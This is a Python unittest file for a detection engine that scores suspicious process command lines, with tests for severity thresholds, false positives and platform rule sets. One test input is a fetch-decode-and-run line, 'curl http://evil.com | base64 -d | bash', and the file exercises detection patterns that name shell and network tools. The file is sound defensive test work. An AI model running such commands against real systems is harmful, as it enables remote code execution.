"""Tests for the detection engine.

The documented example outputs in README.md and CONTRIBUTING.md are asserted
here so the docs cannot drift away from what the code actually scores.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from rules import (  # noqa: E402
    calculate_severity,
    find_suspicious,
    get_rule_sets,
    get_suspicious_keywords,
)


def score(cmdline, system="Darwin"):
    return find_suspicious([cmdline], system=system)


class TestDocumentedExamples(unittest.TestCase):
    """Every expected output published in the README must hold."""

    def assert_detection(self, result, severity, total, matches):
        self.assertEqual(result["severity"], severity)
        self.assertEqual(result["total_score"], total)
        self.assertEqual([f"{p}({s})" for p, s in result["matches"]], matches)

    def test_unix_curl_url(self):
        self.assert_detection(
            score("bash -c \"sleep 2; echo 'curl http://example.com'\""),
            "CRITICAL",
            135,
            ["bash -c(60)", "http://(35)", "curl(25)", ";(15)"],
        )

    def test_unix_pipe(self):
        self.assert_detection(
            score("bash -c \"sleep 2; echo 'hello' | sed 's/hello/ok/'\""),
            "HIGH",
            90,
            ["bash -c(60)", "|(15)", ";(15)"],
        )

    def test_unix_inline_python(self):
        self.assert_detection(
            score("bash -c \"sleep 2; echo 'python -c \\\"print(1)\\\"'\""),
            "CRITICAL",
            125,
            ["bash -c(60)", "python -c(50)", ";(15)"],
        )

    def test_unix_readme_headline_example(self):
        self.assert_detection(
            score("bash -c curl http://evil.com | base64 -d | bash"),
            "CRITICAL",
            215,
            ["base64 -d(80)", "bash -c(60)", "http://(35)", "curl(25)", "|(15)"],
        )

    def test_windows_powershell(self):
        self.assert_detection(
            score(
                "powershell -Command \"Start-Sleep -Seconds 2; Write-Output 'hello'\"",
                system="Windows",
            ),
            "HIGH",
            85,
            ["powershell(70)", ";(15)"],
        )

    def test_windows_encoded_command(self):
        self.assert_detection(
            score(
                "powershell -Command \"Start-Sleep -Seconds 2; "
                "Write-Output '-EncodedCommand'\"",
                system="Windows",
            ),
            "CRITICAL",
            185,
            ["-encodedcommand(100)", "powershell(70)", ";(15)"],
        )


class TestNoDoubleCounting(unittest.TestCase):
    """Overlapping patterns describe one technique and must score once."""

    def test_bash_c_does_not_also_score_sh_c(self):
        result = score("bash -c echo hi")
        self.assertEqual(result["total_score"], 60)
        self.assertEqual([p for p, _ in result["matches"]], ["bash -c"])

    def test_bin_sh_c_does_not_also_score_sh_c(self):
        result = score("/bin/sh -c echo hi")
        self.assertEqual(result["total_score"], 60)
        self.assertEqual([p for p, _ in result["matches"]], ["/bin/sh -c"])

    def test_encodedcommand_does_not_also_score_enc(self):
        result = score("powershell -EncodedCommand ABC", system="Windows")
        self.assertNotIn("-enc", [p for p, _ in result["matches"]])
        self.assertEqual(result["total_score"], 170)


class TestWordBoundaries(unittest.TestCase):
    """A pattern buried inside a longer word is not a match."""

    def test_libcurl_is_not_curl(self):
        self.assertEqual(score("/usr/bin/app --lib /usr/lib/libcurl.dylib")["total_score"], 0)

    def test_sync_is_not_netcat(self):
        self.assertEqual(score("sync -f /tmp")["total_score"], 0)

    def test_real_curl_still_matches(self):
        self.assertEqual(score("curl example.com")["total_score"], 25)

    def test_powershell_exe_still_matches(self):
        self.assertEqual(
            score("C:\\Windows\\powershell.exe", system="Windows")["total_score"], 70
        )


class TestModifiersNeedAnAnchor(unittest.TestCase):
    """Shell punctuation and URLs are noise without a suspicious tool."""

    def test_browser_feature_flag_pipe_is_not_a_detection(self):
        # The real false positive that produced 98% of the original alert log.
        cmdline = (
            "/Applications/Arc.app/Contents/Frameworks/ArcCore.framework/Helpers/"
            "Browser Helper (Renderer) --type=renderer "
            "--origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors "
            "--lang=en-US --num-raster-threads=4"
        )
        result = score(cmdline)
        self.assertEqual(result["severity"], "INFO")
        self.assertEqual(result["matches"], [])

    def test_plain_url_is_not_a_detection(self):
        self.assertEqual(score("dart development-server --url http://127.0.0.1:8181")["total_score"], 0)

    def test_download_in_path_is_not_a_detection(self):
        self.assertEqual(score("/Applications/Stats.app/Stats --dmg /Users/x/download.dmg")["total_score"], 0)

    def test_modifiers_do_count_once_anchored(self):
        self.assertEqual(score("curl http://x.com")["total_score"], 60)  # 25 + 35


class TestSeverityThresholds(unittest.TestCase):
    def test_boundaries(self):
        self.assertEqual(calculate_severity(100), "CRITICAL")
        self.assertEqual(calculate_severity(99), "HIGH")
        self.assertEqual(calculate_severity(70), "HIGH")
        self.assertEqual(calculate_severity(69), "MEDIUM")
        self.assertEqual(calculate_severity(40), "MEDIUM")
        self.assertEqual(calculate_severity(39), "LOW")


class TestPlatformSelection(unittest.TestCase):
    def test_macos_reports_darwin_and_gets_unix_rules(self):
        indicators, _ = get_rule_sets("Darwin")
        self.assertIn(("bash -c", 60), indicators)
        self.assertNotIn(("powershell", 70), indicators)

    def test_windows_gets_windows_rules(self):
        indicators, _ = get_rule_sets("Windows")
        self.assertIn(("powershell", 70), indicators)
        self.assertNotIn(("bash -c", 60), indicators)

    def test_unknown_platform_falls_back_to_everything(self):
        indicators, _ = get_rule_sets("Plan9")
        self.assertIn(("powershell", 70), indicators)
        self.assertIn(("bash -c", 60), indicators)

    def test_documented_pattern_count(self):
        # README states "Monitoring 20 suspicious patterns" on Unix hosts.
        self.assertEqual(len(get_suspicious_keywords("Darwin")), 20)

    def test_clean_command_is_not_flagged(self):
        for cmdline in ("ls -la", "/usr/bin/git status", "whoami", "uname -a", "id"):
            self.assertEqual(score(cmdline)["total_score"], 0, cmdline)


if __name__ == "__main__":
    unittest.main()
